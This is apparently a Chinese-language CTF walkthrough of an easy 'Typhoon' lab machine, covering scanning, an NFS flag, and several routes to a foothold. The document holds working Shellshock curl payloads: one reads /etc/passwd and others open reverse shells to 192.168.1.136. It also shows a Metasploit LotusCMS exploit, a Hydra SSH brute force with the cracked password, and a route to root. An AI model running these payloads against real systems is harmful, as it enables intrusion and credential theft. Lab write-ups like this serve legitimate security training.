
## 靶机信息
级别:容易
有多种方式取得立足点



## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.156

sudo nmap --min-rate 10000 -sT -p- 192.168.1.156 -oA tcp_scan/ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
631/tcp   open  ipp
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
3306/tcp  open  mysql
5432/tcp  open  postgresql
6379/tcp  open  redis
8080/tcp  open  http-proxy
27017/tcp open  mongod
36369/tcp open  unknown
36882/tcp open  unknown
39914/tcp open  unknown
49446/tcp open  unknown
59463/tcp open  unknown
```

## nfs
```shell
showmount -e 192.168.1.156
/typhoon
sudo mount -t nfs 192.168.1.156:/typhoon /tmp
<rec0nm4st3r> R3c0n_m4steeeee3er_fl4g </rec0nm4st3r>
```

## ftp
```shell
ftp 192.168.1.156 //匿名登录 FTP没有内容
```

## Web
```shell
gobuster dir -u http://192.168.1.156 -w /usr/share/wordlists/dirb/common.txt
/robots.txt           (Status: 200) [Size: 37]
```
![[Pasted image 20231014175943.png]]
打开是一个phpMoAdmin页面
![[Pasted image 20231014180158.png]]



### 目录爆破
![[Pasted image 20231014180322.png]]
## CMS
![[Pasted image 20231014180353.png]]
看到是LotusCMS

## 取得立足点
#### nikto发现cve-2014-6271
```shell

nikto -h 192.168.1.156
+ /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271(破壳漏洞)

nc -lvnp 1234

curl -H 'x: () { :;};a=`/bin/cat /etc/passwd`;echo $a' 'http://IP地址/cgi-bin/test.sh' -I //测试命令

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.136/9999 0>&1' http://192.168.1.156/cgi-bin/test.sh 
// or
curl -H 'x: () { :;};a=`/bin/bash -i >& /dev/tcp/192.168.1.136/1234 0>&1`;echo $a' http://192.168.1.156/cgi-bin/test.sh
```

### CMS
#### MFS
```shell
LotusCMS

msfconsole
search LotusCMS
0  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
set URI /cms/
```

### phpmyadmin

![[Pasted image 20231014190204.png]]

```shell
通过phpmyadmin查看到一些账户名，hydra爆破SSH密码
hydra -l typhoon -P /usr/share/wordlists/rockyou.txt 192.168.1.156 ssh -t 16 
typhoon，789456123


```
有一个flag
![[Pasted image 20231014192422.png]]

## smtp
```shell
sudo nmap -p 139,445 --script=vuln --script-args=unsafe=1 192.168.1.156  
msfconsole
```
![[Pasted image 20231014194450.png]]
这里直接得到了root权限
![[Pasted image 20231014194606.png]]

## phpMoAdmin
![[Pasted image 20231014201154.png]]




